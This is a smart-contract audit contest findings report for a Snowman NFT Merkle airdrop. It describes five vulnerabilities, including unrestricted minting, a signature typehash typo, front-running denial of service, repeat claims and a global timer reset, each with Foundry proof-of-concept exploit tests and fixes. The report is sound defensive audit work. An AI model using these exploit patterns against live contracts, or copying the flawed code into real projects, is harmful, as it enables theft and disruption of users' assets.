# Snowman Merkle Airdrop - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Unrestricted NFT Minting in Snowman.sol](#H-01)
    - [H-02. Unconsistent `MESSAGE_TYPEHASH` with standart EIP-712 declaration on contract `SnowmanAirdrop`](#H-02)
- ## Medium Risk Findings
    - [M-01. DoS to a user trying to claim a Snowman](#M-01)
- ## Low Risk Findings
    - [L-01.  Missing Claim Status Check Allows Multiple Claims in SnowmanAirdrop.sol::claimSnowman](#L-01)
    - [L-02.  Global Timer Reset in Snow::buySnow Denies Free Claims for All Users](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #42

### Dates: Jun 12th, 2025 - Jun 19th, 2025

[See more contest details here](https://codehawks.cyfrin.io/c/2025-06-snowman-merkle-airdrop)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 1
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. Unrestricted NFT Minting in Snowman.sol

_Submitted by [flavius](https://profiles.cyfrin.io/u/flavius), [nomadic_bear](https://profiles.cyfrin.io/u/nomadic_bear), [fredo182](https://profiles.cyfrin.io/u/fredo182), [veerendravamsi66](https://profiles.cyfrin.io/u/veerendravamsi66), [wankleven](https://profiles.cyfrin.io/u/wankleven), [sg_milad](https://profiles.cyfrin.io/u/sg_milad), [hyer](https://profiles.cyfrin.io/u/hyer), [shieldrey](https://profiles.cyfrin.io/u/shieldrey), [joewi](https://profiles.cyfrin.io/u/joewi), [nhippolyt](https://profiles.cyfrin.io/u/nhippolyt), [packaging03](https://profiles.cyfrin.io/u/packaging03), [0x00t1](https://profiles.cyfrin.io/u/0x00t1), [perun84](https://profiles.cyfrin.io/u/perun84), [sharkeateateat](https://profiles.cyfrin.io/u/sharkeateateat), [ksiddharth346](https://profiles.cyfrin.io/u/ksiddharth346), [cosminmarian53](https://profiles.cyfrin.io/u/cosminmarian53), [aye__aye](https://profiles.cyfrin.io/u/aye__aye), [0xdaxun](https://profiles.cyfrin.io/u/0xdaxun), [soldev](https://profiles.cyfrin.io/u/soldev), [gurmeetkalyan](https://profiles.cyfrin.io/u/gurmeetkalyan), [tanmaygupta0215](https://profiles.cyfrin.io/u/tanmaygupta0215), [evmninja](https://profiles.cyfrin.io/u/evmninja), [mohankrishkotte](https://profiles.cyfrin.io/u/mohankrishkotte), [0xsamuraijack](https://profiles.cyfrin.io/u/0xsamuraijack), [agilegypsy](https://profiles.cyfrin.io/u/agilegypsy), [cgung854](https://profiles.cyfrin.io/u/cgung854), [ciphermalware](https://profiles.cyfrin.io/u/ciphermalware), [w3boyi](https://profiles.cyfrin.io/u/w3boyi), [ayb](https://profiles.cyfrin.io/u/ayb), [hyperion](https://profiles.cyfrin.io/u/hyperion), [cheesesteak](https://profiles.cyfrin.io/u/cheesesteak), [0xbc000](https://profiles.cyfrin.io/u/0xbc000), [howiecht](https://profiles.cyfrin.io/u/howiecht), [whitehacker](https://profiles.cyfrin.io/u/whitehacker), [teoslaf](https://profiles.cyfrin.io/u/teoslaf), [civil](https://profiles.cyfrin.io/u/civil), [leonardosaputra456](https://profiles.cyfrin.io/u/leonardosaputra456), [soarinskysagar](https://profiles.cyfrin.io/u/soarinskysagar), [lcfr](https://profiles.cyfrin.io/u/lcfr), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [khan_afzali](https://profiles.cyfrin.io/u/khan_afzali), [venkyp2552](https://profiles.cyfrin.io/u/venkyp2552), [0xchaddb](https://profiles.cyfrin.io/u/0xchaddb), [nodepirate](https://profiles.cyfrin.io/u/nodepirate), [anchabadze](https://profiles.cyfrin.io/u/anchabadze), [azriel20005](https://profiles.cyfrin.io/u/azriel20005), [saneryee](https://profiles.cyfrin.io/u/saneryee), [woozie](https://profiles.cyfrin.io/u/woozie), [robercano](https://profiles.cyfrin.io/u/robercano), [jufel](https://profiles.cyfrin.io/u/jufel), [juliancabmar](https://profiles.cyfrin.io/u/juliancabmar), [0xziin](https://profiles.cyfrin.io/u/0xziin), [0xjoaovictor](https://profiles.cyfrin.io/u/0xjoaovictor), [blackgrease](https://profiles.cyfrin.io/u/blackgrease), [anukalateef](https://profiles.cyfrin.io/u/anukalateef), [0xtory](https://profiles.cyfrin.io/u/0xtory), [shadowyghost](https://profiles.cyfrin.io/u/shadowyghost), [francohacker](https://profiles.cyfrin.io/u/francohacker), [juanalacubana](https://profiles.cyfrin.io/u/juanalacubana), [faran](https://profiles.cyfrin.io/u/faran), [codeaudit0x1](https://profiles.cyfrin.io/u/codeaudit0x1), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [qasimlab118](https://profiles.cyfrin.io/u/qasimlab118), [rootkit677](https://profiles.cyfrin.io/u/rootkit677), [lefeveje](https://profiles.cyfrin.io/u/lefeveje), [troglodytsec](https://profiles.cyfrin.io/u/troglodytsec), [lmsand](https://profiles.cyfrin.io/u/lmsand), [lanceaddison17](https://profiles.cyfrin.io/u/lanceaddison17), [jfornells](https://profiles.cyfrin.io/u/jfornells), [felixmedia78](https://profiles.cyfrin.io/u/felixmedia78). Selected submission by: [nomadic_bear](https://profiles.cyfrin.io/u/nomadic_bear)._      
            


# Root + Impact

## Description

* The Snowman NFT contract is designed to mint NFTs through a controlled airdrop mechanism where only authorized entities should be able to create new tokens for eligible recipients.

* The `mintSnowman()` function lacks any access control mechanisms, allowing any external address to call the function and mint unlimited NFTs to any recipient without authorization, completely bypassing the intended airdrop distribution model.

```Solidity
// Root cause in the codebase
function mintSnowman(address receiver, uint256 amount) external {
@>  // NO ACCESS CONTROL - Any address can call this function
   for (uint256 i = 0; i < amount; i++) {
       _safeMint(receiver, s_TokenCounter);

       emit SnowmanMinted(receiver, s_TokenCounter);

       s_TokenCounter++;
   }
@>  // NO VALIDATION - No checks on amount or caller authorization
}
```

## Risk

**Likelihood**:

* The vulnerability will be exploited as soon as any malicious actor discovers the contract address, since the function is publicly accessible with no restrictions

* Automated scanning tools and MEV bots continuously monitor new contract deployments for exploitable functions, making discovery inevitable

**Impact**:

* Complete destruction of tokenomics through unlimited supply inflation, rendering all legitimate NFTs worthless

* Total compromise of the airdrop mechanism, allowing attackers to mint millions of tokens and undermine the project's credibility and economic model

## Proof of Concept

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {Snowman} from "../src/Snowman.sol";

contract SnowmanExploitPoC is Test {
    Snowman public snowman;
    address public attacker = makeAddr("attacker");
    
    string constant SVG_URI = "data:image/svg+xml;base64,PHN2Zy4uLi4+";
    
    function setUp() public {
        snowman = new Snowman(SVG_URI);
    }
    
    function testExploit_UnrestrictedMinting() public {
        console2.log("=== UNRESTRICTED MINTING EXPLOIT ===");
        console2.log("Initial token counter:", snowman.getTokenCounter());
        console2.log("Attacker balance before:", snowman.balanceOf(attacker));
        
        // EXPLOIT: Anyone can mint unlimited NFTs
        vm.prank(attacker);
        snowman.mintSnowman(attacker, 1000); // Mint 1K NFTs
        
        console2.log("Final token counter:", snowman.getTokenCounter());
        console2.log("Attacker balance after:", snowman.balanceOf(attacker));
        
        // Verify exploit success
        assertEq(snowman.balanceOf(attacker), 1000);
        assertEq(snowman.getTokenCounter(), 1000);
        
        console2.log(" EXPLOIT SUCCESSFUL - Minted 1K NFTs without authorization");
    }
}
```

<br />

PoC Results:

```Solidity
forge test --match-test testExploit_UnrestrictedMinting -vv
[⠑] Compiling...
[⠢] Compiling 1 files with Solc 0.8.29
[⠰] Solc 0.8.29 finished in 1.45s
Compiler run successful!

Ran 1 test for test/SnowmanExploitPoC.t.sol:SnowmanExploitPoC       
[PASS] testExploit_UnrestrictedMinting() (gas: 26868041)
Logs:
  === UNRESTRICTED MINTING EXPLOIT ===
  Initial token counter: 0
  Attacker balance before: 0
  Final token counter: 1000
  Attacker balance after: 1000
   EXPLOIT SUCCESSFUL - Minted 1K NFTs without authorization        

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.28ms (3.58ms CPU time)

Ran 1 test suite in 10.15ms (4.28ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommended Mitigation

Adding the `onlyOwner` modifier restricts the `mintSnowman()` function to only be callable by the contract owner, preventing unauthorized addresses from minting NFTs.

```diff
- function mintSnowman(address receiver, uint256 amount) external {
+ function mintSnowman(address receiver, uint256 amount) external onlyOwner {
      for (uint256 i = 0; i < amount; i++) {
          _safeMint(receiver, s_TokenCounter);

          emit SnowmanMinted(receiver, s_TokenCounter);

          s_TokenCounter++;
      }
  }
```

## <a id='H-02'></a>H-02. Unconsistent `MESSAGE_TYPEHASH` with standart EIP-712 declaration on contract `SnowmanAirdrop`

_Submitted by [nodesmesta](https://profiles.cyfrin.io/u/nodesmesta), [codeaudit0x1](https://profiles.cyfrin.io/u/codeaudit0x1), [veerendravamsi66](https://profiles.cyfrin.io/u/veerendravamsi66), [shieldrey](https://profiles.cyfrin.io/u/shieldrey), [smexor](https://profiles.cyfrin.io/u/smexor), [hyer](https://profiles.cyfrin.io/u/hyer), [fredopapi7](https://profiles.cyfrin.io/u/fredopapi7), [perun84](https://profiles.cyfrin.io/u/perun84), [cosminmarian53](https://profiles.cyfrin.io/u/cosminmarian53), [evmninja](https://profiles.cyfrin.io/u/evmninja), [0xsamuraijack](https://profiles.cyfrin.io/u/0xsamuraijack), [fredo182](https://profiles.cyfrin.io/u/fredo182), [ayb](https://profiles.cyfrin.io/u/ayb), [gurmeetkalyan](https://profiles.cyfrin.io/u/gurmeetkalyan), [luq344n](https://profiles.cyfrin.io/u/luq344n), [snake_salad_67](https://profiles.cyfrin.io/u/snake_salad_67), [0xchaddb](https://profiles.cyfrin.io/u/0xchaddb), [nodepirate](https://profiles.cyfrin.io/u/nodepirate), [anchabadze](https://profiles.cyfrin.io/u/anchabadze), [jufel](https://profiles.cyfrin.io/u/jufel), [samuelsmith442](https://profiles.cyfrin.io/u/samuelsmith442), [juliancabmar](https://profiles.cyfrin.io/u/juliancabmar), [0xjoaovictor](https://profiles.cyfrin.io/u/0xjoaovictor), [whitehacker](https://profiles.cyfrin.io/u/whitehacker), [0xtory](https://profiles.cyfrin.io/u/0xtory), [saneryee](https://profiles.cyfrin.io/u/saneryee), [faran](https://profiles.cyfrin.io/u/faran), [shabihethsec](https://profiles.cyfrin.io/u/shabihethsec), [rootkit677](https://profiles.cyfrin.io/u/rootkit677), [cgung854](https://profiles.cyfrin.io/u/cgung854), [lefeveje](https://profiles.cyfrin.io/u/lefeveje), [accessdenied](https://profiles.cyfrin.io/u/accessdenied). Selected submission by: [nodesmesta](https://profiles.cyfrin.io/u/nodesmesta)._      
            


# Root + Impact

## Description

* Little typo on `MESSAGE_TYPEHASH` Declaration on `SnowmanAirdrop` contract

```Solidity
// src/SnowmanAirdrop.sol

49:   bytes32 private constant MESSAGE_TYPEHASH = keccak256("SnowmanClaim(addres receiver, uint256 amount)");
```

**Impact**:

* `function claimSnowman` never be `TRUE` condition

## Proof of Concept

Applying this function at the end of /test/TestSnowmanAirdrop.t.sol to know what the correct and wrong digest output HASH.

Ran with command: `forge test --match-test testFrontendSignatureVerification -vvvv`

```Solidity
    function testFrontendSignatureVerification() public {
        // Setup Alice for the test
        vm.startPrank(alice);
        snow.approve(address(airdrop), 1);
        vm.stopPrank();
        
        // Simulate frontend using the correct format
        bytes32 FRONTEND_MESSAGE_TYPEHASH = keccak256("SnowmanClaim(address receiver, uint256 amount)");
        
        // Domain separator used by frontend (per EIP-712)
        bytes32 DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256("Snowman Airdrop"),
                keccak256("1"),
                block.chainid,
                address(airdrop)
            )
        );
        
        // Get Alice's token amount
        uint256 amount = snow.balanceOf(alice);
        
        // Frontend creates hash using the correct format
        bytes32 structHash = keccak256(
            abi.encode(
                FRONTEND_MESSAGE_TYPEHASH,
                alice,
                amount
            )
        );
        
        // Frontend creates the final digest (per EIP-712)
        bytes32 frontendDigest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                DOMAIN_SEPARATOR,
                structHash
            )
        );
        
        // Alice signs the digest created by the frontend
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alKey, frontendDigest);
        
        // Digest created by the contract (with typo)
        bytes32 contractDigest = airdrop.getMessageHash(alice);
        
        // Display both digests for comparison
        console2.log("Frontend Digest (correct format):");
        console2.logBytes32(frontendDigest);
        console2.log("Contract Digest (with typo):");
        console2.logBytes32(contractDigest);
        
        // Compare the digests - they should differ due to the typo
        assertFalse(
            frontendDigest == contractDigest,
            "Digests should differ due to typo in MESSAGE_TYPEHASH"
        );
        
        // Attempt to claim with the signature - should fail
        vm.prank(satoshi);
        vm.expectRevert(SnowmanAirdrop.SA__InvalidSignature.selector);
        airdrop.claimSnowman(alice, AL_PROOF, v, r, s);
        

        assertEq(nft.balanceOf(alice), 0);
    }
```

## Recommended Mitigation

on contract `SnowmanAirdrop` Line 49 applying this:

```diff
- bytes32 private constant MESSAGE_TYPEHASH = keccak256("SnowmanClaim(addres receiver, uint256 amount)");
+ bytes32 private constant MESSAGE_TYPEHASH = keccak256("SnowmanClaim(address receiver, uint256 amount)");
```


# Medium Risk Findings

## <a id='M-01'></a>M-01. DoS to a user trying to claim a Snowman

_Submitted by [wankleven](https://profiles.cyfrin.io/u/wankleven), [fredopapi7](https://profiles.cyfrin.io/u/fredopapi7), [cheesesteak](https://profiles.cyfrin.io/u/cheesesteak), [nhippolyt](https://profiles.cyfrin.io/u/nhippolyt), [shieldrey](https://profiles.cyfrin.io/u/shieldrey), [0xsamuraijack](https://profiles.cyfrin.io/u/0xsamuraijack), [agilegypsy](https://profiles.cyfrin.io/u/agilegypsy), [cosminmarian53](https://profiles.cyfrin.io/u/cosminmarian53), [0xbc000](https://profiles.cyfrin.io/u/0xbc000), [blackgrease](https://profiles.cyfrin.io/u/blackgrease), [soarinskysagar](https://profiles.cyfrin.io/u/soarinskysagar), [venkyp2552](https://profiles.cyfrin.io/u/venkyp2552), [joewi](https://profiles.cyfrin.io/u/joewi), [luq344n](https://profiles.cyfrin.io/u/luq344n), [nodepirate](https://profiles.cyfrin.io/u/nodepirate), [azriel20005](https://profiles.cyfrin.io/u/azriel20005), [robercano](https://profiles.cyfrin.io/u/robercano), [jufel](https://profiles.cyfrin.io/u/jufel), [juliancabmar](https://profiles.cyfrin.io/u/juliancabmar), [anchabadze](https://profiles.cyfrin.io/u/anchabadze), [faran](https://profiles.cyfrin.io/u/faran), [ksiddharth346](https://profiles.cyfrin.io/u/ksiddharth346), [lanceaddison17](https://profiles.cyfrin.io/u/lanceaddison17), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [felixmedia78](https://profiles.cyfrin.io/u/felixmedia78). Selected submission by: [robercano](https://profiles.cyfrin.io/u/robercano)._      
            


# Root + Impact

## Description

* Users will approve a specific amount of Snow to the SnowmanAirdrop and also sign a message with their address and that same amount, in order to be able to claim the NFT

* Because the current amount of Snow owned by the user is used in the verification, an attacker could forcefully send Snow to the receiver in a front-running attack, to prevent the receiver from claiming the NFT.&#x20;

```Solidity
function getMessageHash(address receiver) public view returns (bytes32) {
...
  // @audit HIGH An attacker could send 1 wei of Snow token to the receiver and invalidate the signature, causing the receiver to never be able to claim their Snowman
  uint256 amount = i_snow.balanceOf(receiver);

  return _hashTypedDataV4(
      keccak256(abi.encode(MESSAGE_TYPEHASH, SnowmanClaim({receiver: receiver, amount: amount})))
  );
```

## Risk

**Likelihood**:

* The attacker must purchase Snow and forcefully send it to the receiver in a front-running attack, so the likelihood is Medium

**Impact**:

* The impact is High as it could lock out the receiver from claiming forever

## Proof of Concept

The attack consists on Bob sending an extra Snow token to Alice before Satoshi claims the NFT on behalf of Alice. To showcase the risk, the extra Snow is earned for free by Bob.

```Solidity
     function testDoSClaimSnowman() public {
        assert(snow.balanceOf(alice) == 1);

        // Get alice's digest while the amount is still 1
        bytes32 alDigest = airdrop.getMessageHash(alice);
        // alice signs a message
        (uint8 alV, bytes32 alR, bytes32 alS) = vm.sign(alKey, alDigest);

        vm.startPrank(bob);
        vm.warp(block.timestamp + 1 weeks);

        snow.earnSnow();

        assert(snow.balanceOf(bob) == 2);
        snow.transfer(alice, 1);

        // Alice claim test
        assert(snow.balanceOf(alice) == 2);

        vm.startPrank(alice);
        snow.approve(address(airdrop), 1);

        // satoshi calls claims on behalf of alice using her signed message
        vm.startPrank(satoshi);
        vm.expectRevert();

        airdrop.claimSnowman(alice, AL_PROOF, alV, alR, alS);
     }
```

## Recommended Mitigation

Include the amount to be claimed in both `getMessageHash` and `claimSnowman` instead of reading it from the Snow contract. Showing only the new code in the section below

```Python
function claimSnowman(address receiver, uint256 amount, bytes32[] calldata merkleProof, uint8 v, bytes32 r, bytes32 s)
        external
        nonReentrant
    {
        ...

        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(receiver, amount))));

        if (!MerkleProof.verify(merkleProof, i_merkleRoot, leaf)) {
            revert SA__InvalidProof();
        }

        // @audit LOW Seems like using the ERC20 permit here would allow for both the delegation of the claim and the transfer of the Snow tokens in one transaction
        i_snow.safeTransferFrom(receiver, address(this), amount); // send 

        ...
    }
```


# Low Risk Findings

## <a id='L-01'></a>L-01.  Missing Claim Status Check Allows Multiple Claims in SnowmanAirdrop.sol::claimSnowman

_Submitted by [wankleven](https://profiles.cyfrin.io/u/wankleven), [mihailvichev00](https://profiles.cyfrin.io/u/mihailvichev00), [nodesmesta](https://profiles.cyfrin.io/u/nodesmesta), [hyer](https://profiles.cyfrin.io/u/hyer), [smexor](https://profiles.cyfrin.io/u/smexor), [khandelwalmoksh787](https://profiles.cyfrin.io/u/khandelwalmoksh787), [nhippolyt](https://profiles.cyfrin.io/u/nhippolyt), [fredopapi7](https://profiles.cyfrin.io/u/fredopapi7), [shieldrey](https://profiles.cyfrin.io/u/shieldrey), [cosminmarian53](https://profiles.cyfrin.io/u/cosminmarian53), [perun84](https://profiles.cyfrin.io/u/perun84), [wolf_kalp](https://profiles.cyfrin.io/u/wolf_kalp), [gurmeetkalyan](https://profiles.cyfrin.io/u/gurmeetkalyan), [evmninja](https://profiles.cyfrin.io/u/evmninja), [hawks](https://profiles.cyfrin.io/u/hawks), [0xsamuraijack](https://profiles.cyfrin.io/u/0xsamuraijack), [hyperion](https://profiles.cyfrin.io/u/hyperion), [whitehacker](https://profiles.cyfrin.io/u/whitehacker), [The Seraphs](https://codehawks.cyfrin.io/team/clqhydutl0005v5vlsy3t79wm), [soarinskysagar](https://profiles.cyfrin.io/u/soarinskysagar), [venkyp2552](https://profiles.cyfrin.io/u/venkyp2552), [blackgrease](https://profiles.cyfrin.io/u/blackgrease), [0xbc000](https://profiles.cyfrin.io/u/0xbc000), [joewi](https://profiles.cyfrin.io/u/joewi), [0xchaddb](https://profiles.cyfrin.io/u/0xchaddb), [nodepirate](https://profiles.cyfrin.io/u/nodepirate), [anchabadze](https://profiles.cyfrin.io/u/anchabadze), [jufel](https://profiles.cyfrin.io/u/jufel), [0xziin](https://profiles.cyfrin.io/u/0xziin), [geeby_1](https://profiles.cyfrin.io/u/geeby_1), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [faran](https://profiles.cyfrin.io/u/faran), [rootkit677](https://profiles.cyfrin.io/u/rootkit677), [lefeveje](https://profiles.cyfrin.io/u/lefeveje), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [the2ke](https://profiles.cyfrin.io/u/the2ke), [jfornells](https://profiles.cyfrin.io/u/jfornells), [lanceaddison17](https://profiles.cyfrin.io/u/lanceaddison17). Selected submission by: [whitehacker](https://profiles.cyfrin.io/u/whitehacker)._      
            


# Root + Impact

&#x20;

**Root:** The [`claimSnowman`](https://github.com/CodeHawks-Contests/2025-06-snowman-merkle-airdrop/blob/b63f391444e69240f176a14a577c78cb85e4cf71/src/SnowmanAirdrop.sol#L44) function updates `s_hasClaimedSnowman[receiver] = true` but never checks if the user has already claimed before processing the claim, allowing users to claim multiple times if they acquire more Snow tokens.

**Impact:** Users can bypass the intended one-time airdrop limit by claiming, acquiring more Snow tokens, and claiming again, breaking the airdrop distribution model and allowing unlimited NFT minting for eligible users.

## Description

* **Normal Behavior:** Airdrop mechanisms should enforce one claim per eligible user to ensure fair distribution and prevent abuse of the reward system.
* **Specific Issue:** The function sets the claim status to true after processing but never validates if `s_hasClaimedSnowman[receiver]` is already true at the beginning, allowing users to claim multiple times as long as they have Snow tokens and valid proofs.

## Risk

**Likelihood**: Medium

* Users need to acquire additional Snow tokens between claims, which requires time and effort
* Users must maintain their merkle proof validity across multiple claims
* Attack requires understanding of the missing validation check

**Impact**: High

* **Airdrop Abuse**: Users can claim far more NFTs than intended by the distribution mechanism
* **Unfair Distribution**: Some users receive multiple rewards while others may receive none
* **Economic Manipulation**: Breaks the intended scarcity and distribution model of the NFT collection

## Proof of Concept

Add the following test to TestSnowMan.t.sol 

```Solidity
function testMultipleClaimsAllowed() public {
        // Alice claims her first NFT
        vm.prank(alice);
        snow.approve(address(airdrop), 1);

        bytes32 aliceDigest = airdrop.getMessageHash(alice);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alKey, aliceDigest);

        vm.prank(alice);
        airdrop.claimSnowman(alice, AL_PROOF, v, r, s);

        assert(nft.balanceOf(alice) == 1);
        assert(airdrop.getClaimStatus(alice) == true);

        // Alice acquires more Snow tokens (wait for timer and earn again)
        vm.warp(block.timestamp + 1 weeks);
        vm.prank(alice);
        snow.earnSnow();

        // Alice can claim AGAIN with new Snow tokens!
        vm.prank(alice);
        snow.approve(address(airdrop), 1);

        bytes32 aliceDigest2 = airdrop.getMessageHash(alice);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(alKey, aliceDigest2);

        vm.prank(alice);
        airdrop.claimSnowman(alice, AL_PROOF, v2, r2, s2); // Second claim succeeds!

        assert(nft.balanceOf(alice) == 2); // Alice now has 2 NFTs
    }
```

## Recommended Mitigation

**Add a claim status check at the beginning of the function** to prevent users from claiming multiple times.

```diff
// Add new error
+ error SA__AlreadyClaimed();

function claimSnowman(address receiver, bytes32[] calldata merkleProof, uint8 v, bytes32 r, bytes32 s)
    external
    nonReentrant
{
+   if (s_hasClaimedSnowman[receiver]) {
+       revert SA__AlreadyClaimed();
+   }
+   
    if (receiver == address(0)) {
        revert SA__ZeroAddress();
    }
    
    // Rest of function logic...
    
    s_hasClaimedSnowman[receiver] = true;
}
```

## <a id='L-02'></a>L-02.  Global Timer Reset in Snow::buySnow Denies Free Claims for All Users

_Submitted by [nhippolyt](https://profiles.cyfrin.io/u/nhippolyt), [ksiddharth346](https://profiles.cyfrin.io/u/ksiddharth346), [wolf_kalp](https://profiles.cyfrin.io/u/wolf_kalp), [shieldrey](https://profiles.cyfrin.io/u/shieldrey), [hawks](https://profiles.cyfrin.io/u/hawks), [sharkeateateat](https://profiles.cyfrin.io/u/sharkeateateat), [perun84](https://profiles.cyfrin.io/u/perun84), [geeby_1](https://profiles.cyfrin.io/u/geeby_1), [evmninja](https://profiles.cyfrin.io/u/evmninja), [0xsamuraijack](https://profiles.cyfrin.io/u/0xsamuraijack), [ciphermalware](https://profiles.cyfrin.io/u/ciphermalware), [mohankrishkotte](https://profiles.cyfrin.io/u/mohankrishkotte), [myssteeque](https://profiles.cyfrin.io/u/myssteeque), [civil](https://profiles.cyfrin.io/u/civil), [hyperion](https://profiles.cyfrin.io/u/hyperion), [0xbc000](https://profiles.cyfrin.io/u/0xbc000), [howiecht](https://profiles.cyfrin.io/u/howiecht), [teoslaf](https://profiles.cyfrin.io/u/teoslaf), [nomadic_bear](https://profiles.cyfrin.io/u/nomadic_bear), [blackgrease](https://profiles.cyfrin.io/u/blackgrease), [soarinskysagar](https://profiles.cyfrin.io/u/soarinskysagar), [droopyman12](https://profiles.cyfrin.io/u/droopyman12), [0xchaddb](https://profiles.cyfrin.io/u/0xchaddb), [nodepirate](https://profiles.cyfrin.io/u/nodepirate), [anchabadze](https://profiles.cyfrin.io/u/anchabadze), [cgung854](https://profiles.cyfrin.io/u/cgung854), [azriel20005](https://profiles.cyfrin.io/u/azriel20005), [jufel](https://profiles.cyfrin.io/u/jufel), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [juliancabmar](https://profiles.cyfrin.io/u/juliancabmar), [rubik0n](https://profiles.cyfrin.io/u/rubik0n), [snake_salad_67](https://profiles.cyfrin.io/u/snake_salad_67), [shadowyghost](https://profiles.cyfrin.io/u/shadowyghost), [francohacker](https://profiles.cyfrin.io/u/francohacker), [juanalacubana](https://profiles.cyfrin.io/u/juanalacubana), [qasimlab118](https://profiles.cyfrin.io/u/qasimlab118), [troglodytsec](https://profiles.cyfrin.io/u/troglodytsec), [manaxtech](https://profiles.cyfrin.io/u/manaxtech), [kmrnxd](https://profiles.cyfrin.io/u/kmrnxd). Selected submission by: [nhippolyt](https://profiles.cyfrin.io/u/nhippolyt)._      
            


## Description:

The `Snow::buySnow` function contains a critical flaw where it resets a global timer `(s_earnTimer)` to the current block timestamp on every invocation. This timer controls eligibility for free token claims via `Snow::earnSnow()`, which requires 1 week to pass since the last timer reset. As a result:

Any token purchase `(via buySnow)` blocks all free claims for all users for 7 days

Malicious actors can permanently suppress free claims with micro-transactions

Contradicts protocol documentation promising **"free weekly claims per user"**

## Impact:

* **Complete Denial-of-Service:** Free claim mechanism becomes unusable

* **Broken Protocol Incentives:** Undermines core user acquisition strategy

* **Economic Damage:** Eliminates promised free distribution channel

* **Reputation Harm:** Users perceive protocol as dishonest

```solidity
    function buySnow(uint256 amount) external payable canFarmSnow {
        if (msg.value == (s_buyFee * amount)) {
            _mint(msg.sender, amount);
        } else {
            i_weth.safeTransferFrom(msg.sender, address(this), (s_buyFee * amount));
            _mint(msg.sender, amount);
        }

  @>      s_earnTimer = block.timestamp;

        emit SnowBought(msg.sender, amount);
    }
```

## Risk

**Likelihood**:

• Triggered by normal protocol usage (any purchase)
• Requires only one transaction every 7 days to maintain blockage
• Incentivized attack (low-cost disruption)

**Impact**:

• Permanent suppression of core protocol feature
• Loss of user trust and adoption
• Violates documented tokenomics

## Proof of Concept

**Attack Scenario:** Permanent Free Claim Suppression

* Attacker calls **buySnow(1)** with minimum payment

* **s\_earnTimer** sets to current timestamp (T0)

* All **earnSnow()** calls revert for **next 7 days**

* On day 6, attacker repeats **buySnow(1)**

* New timer reset (T1 = T0+6 days)

* Free claims blocked until **T1+7 days (total 13 days)**

* Repeat step **4 every 6 days → permanent blockage**
  **Test Case:**

```solidity
// Day 0: Deploy contract
snow = new Snow(...);  // s_earnTimer = 0

// UserA claims successfully
snow.earnSnow(); // Success (first claim always allowed)

// Day 1: UserB buys 1 token
snow.buySnow(1); // Resets global timer to day 1

// Day 2: UserA attempts claim
snow.earnSnow(); // Reverts! Requires day 1+7 = day 8

// Day 7: UserC buys 1 token (day 7 < day 1+7)
snow.buySnow(1); // Resets timer to day 7

// Day 8: UserA retries
snow.earnSnow(); // Still reverts! Now requires day 7+7 = day 14
```

## Recommended Mitigation

**Step 1:** Remove Global Timer Reset from `buySnow`

```diff
function buySnow(uint256 amount) external payable canFarmSnow {
     // ... existing payment logic ...
-     s_earnTimer = block.timestamp;
       emit SnowBought(msg.sender, amount);
}
```

**Step 2:** Implement Per-User Timer in `earnSnow`

```solidity
// Add new state variable
mapping(address => uint256) private s_lastClaimTime;

function earnSnow() external canFarmSnow {
    // Check per-user timer instead of global
    if (s_lastClaimTime[msg.sender] != 0 && 
        block.timestamp < s_lastClaimTime[msg.sender] + 1 weeks
    ) {
        revert S__Timer();
    }
    
    _mint(msg.sender, 1);
    s_lastClaimTime[msg.sender] = block.timestamp; // Update user-specific timer
    emit SnowEarned(msg.sender, 1); // Add missing event
}
```

**Step 3:** Initialize First Claim (Constructor)

```solidity
constructor(...) {
    // Initialize with current timestamp to prevent immediate claims
    s_lastClaimTime[address(0)] = block.timestamp;
}
```





    